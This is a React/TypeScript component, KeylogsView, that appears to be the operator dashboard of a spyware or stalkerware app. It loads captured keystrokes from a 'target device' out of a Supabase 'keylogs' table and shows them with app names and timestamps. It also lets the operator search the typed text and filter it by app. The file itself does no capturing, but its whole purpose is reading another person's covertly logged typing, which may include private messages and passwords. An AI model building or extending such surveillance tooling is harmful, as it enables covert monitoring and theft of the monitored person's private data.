import { useEffect, useState } from 'react';
import { supabase, Device, Keylog } from '../../lib/supabase';
import { useAuth } from '../../contexts/AuthContext';
import { format } from 'date-fns';
import { Keyboard, Search, ChevronLeft, ChevronRight, Loader2 } from 'lucide-react';

export function KeylogsView() {
  const { } = useAuth();
  const [devices, setDevices] = useState<Device[]>([]);
  const [selectedDevice, setSelectedDevice] = useState<Device | null>(null);
  const [keylogs, setKeylogs] = useState<Keylog[]>([]);
  const [loading, setLoading] = useState(true);
  const [search, setSearch] = useState('');
  const [appFilter, setAppFilter] = useState<string>('all');
  const [currentPage, setCurrentPage] = useState(1);
  const [totalCount, setTotalCount] = useState(0);
  const pageSize = 30;

  useEffect(() => {
    fetchDevices();
  }, []);

  useEffect(() => {
    if (selectedDevice) {
      fetchKeylogs();
    }
  }, [selectedDevice, search, appFilter, currentPage]);

  const fetchDevices = async () => {
    const { data } = await supabase.from('devices').select('*').order('created_at', { ascending: false });
    if (data && data.length > 0) {
      setDevices(data as Device[]);
      setSelectedDevice(data[0] as Device);
    }
    setLoading(false);
  };

  const fetchKeylogs = async () => {
    if (!selectedDevice) return;
    setLoading(true);

    let query = supabase
      .from('keylogs')
      .select('*', { count: 'exact' })
      .eq('device_id', selectedDevice.id)
      .order('timestamp', { ascending: false });

    if (appFilter !== 'all') {
      query = query.eq('app_name', appFilter);
    }
    if (search) {
      query = query.ilike('text_input', `%${search}%`);
    }

    query = query.range((currentPage - 1) * pageSize, currentPage * pageSize - 1);

    const { data, count } = await query;
    setKeylogs((data || []) as Keylog[]);
    setTotalCount(count || 0);
    setLoading(false);
  };

  const uniqueApps = [...new Set(keylogs.map((k) => k.app_name).filter((a): a is string => Boolean(a)))];

  const totalPages = Math.ceil(totalCount / pageSize);

  return (
    <div className="space-y-6">
      {/* Header */}
      <div className="flex flex-col sm:flex-row sm:items-center sm:justify-between gap-4">
        <div>
          <h1 className="text-2xl font-bold text-gray-900 dark:text-white">Keylogger</h1>
          <p className="text-gray-500 dark:text-gray-400">View keystroke activity from the target device</p>
        </div>
        <select
          value={selectedDevice?.id || ''}
          onChange={(e) => setSelectedDevice(devices.find((d) => d.id === e.target.value) || null)}
          className="px-4 py-2 bg-white dark:bg-slate-800 border border-gray-200 dark:border-slate-700 rounded-lg text-sm"
        >
          {devices.map((device) => (
            <option key={device.id} value={device.id}>
              {device.device_name}
            </option>
          ))}
        </select>
      </div>

      {/* Filters */}
      <div className="bg-white dark:bg-slate-800 rounded-xl border border-gray-200 dark:border-slate-700 shadow-sm p-4">
        <div className="flex flex-col sm:flex-row gap-4">
          <div className="flex-1 relative">
            <Search className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-400" />
            <input
              type="text"
              value={search}
              onChange={(e) => {
                setSearch(e.target.value);
                setCurrentPage(1);
              }}
              placeholder="Search within keystrokes..."
              className="w-full pl-10 pr-4 py-2 bg-gray-50 dark:bg-slate-700 border border-gray-200 dark:border-slate-600 rounded-lg"
            />
          </div>
          <select
            value={appFilter}
            onChange={(e) => {
              setAppFilter(e.target.value);
              setCurrentPage(1);
            }}
            className="px-4 py-2 bg-gray-50 dark:bg-slate-700 border border-gray-200 dark:border-slate-600 rounded-lg"
          >
            <option value="all">All Apps</option>
            {uniqueApps.map((app) => (
              <option key={app} value={app}>
                {app}
              </option>
            ))}
          </select>
        </div>
      </div>

      {/* Timeline */}
      <div className="bg-white dark:bg-slate-800 rounded-xl border border-gray-200 dark:border-slate-700 shadow-sm overflow-hidden">
        {loading ? (
          <div className="flex items-center justify-center h-64">
            <Loader2 className="w-8 h-8 animate-spin text-emerald-500" />
          </div>
        ) : keylogs.length > 0 ? (
          <>
            <div className="relative">
              <div className="absolute left-6 top-0 bottom-0 w-px bg-gray-200 dark:bg-slate-700" />
              <div className="divide-y divide-gray-200 dark:divide-slate-700">
                {keylogs.map((log) => (
                  <div key={log.id} className="p-4 pl-12 relative">
                    <div className="absolute left-4 top-1/2 -translate-y-1/2 w-4 h-4 rounded-full bg-emerald-500 border-4 border-white dark:border-slate-800" />
                    <div className="flex items-start justify-between gap-4">
                      <div className="flex-1 min-w-0">
                        {log.app_name && (
                          <p className="text-xs text-emerald-600 dark:text-emerald-400 font-medium mb-1">
                            {log.app_name}
                          </p>
                        )}
                        <p className="text-sm text-gray-900 dark:text-white break-all">
                          {log.text_input}
                        </p>
                      </div>
                      <div className="text-right flex-shrink-0">
                        <p className="text-xs text-gray-500 dark:text-gray-400">
                          {format(new Date(log.timestamp), 'p')}
                        </p>
                        <p className="text-xs text-gray-400 dark:text-gray-500">
                          {format(new Date(log.timestamp), 'PP')}
                        </p>
                      </div>
                    </div>
                  </div>
                ))}
              </div>
            </div>

            {/* Pagination */}
            <div className="flex items-center justify-between px-4 py-3 border-t border-gray-200 dark:border-slate-700">
              <p className="text-sm text-gray-500 dark:text-gray-400">
                Showing {(currentPage - 1) * pageSize + 1} - {Math.min(currentPage * pageSize, totalCount)} of {totalCount}
              </p>
              <div className="flex items-center gap-2">
                <button
                  onClick={() => setCurrentPage((p) => Math.max(1, p - 1))}
                  disabled={currentPage === 1}
                  className="p-2 rounded-lg hover:bg-gray-100 dark:hover:bg-slate-700 disabled:opacity-50 disabled:cursor-not-allowed"
                >
                  <ChevronLeft className="w-5 h-5" />
                </button>
                <span className="text-sm text-gray-600 dark:text-gray-300">
                  Page {currentPage} of {totalPages}
                </span>
                <button
                  onClick={() => setCurrentPage((p) => Math.min(totalPages, p + 1))}
                  disabled={currentPage === totalPages}
                  className="p-2 rounded-lg hover:bg-gray-100 dark:hover:bg-slate-700 disabled:opacity-50 disabled:cursor-not-allowed"
                >
                  <ChevronRight className="w-5 h-5" />
                </button>
              </div>
            </div>
          </>
        ) : (
          <div className="flex flex-col items-center justify-center h-64 text-center">
            <Keyboard className="w-12 h-12 text-gray-400 mb-4" />
            <p className="text-gray-500 dark:text-gray-400">No keylogger data available</p>
          </div>
        )}
      </div>
    </div>
  );
}
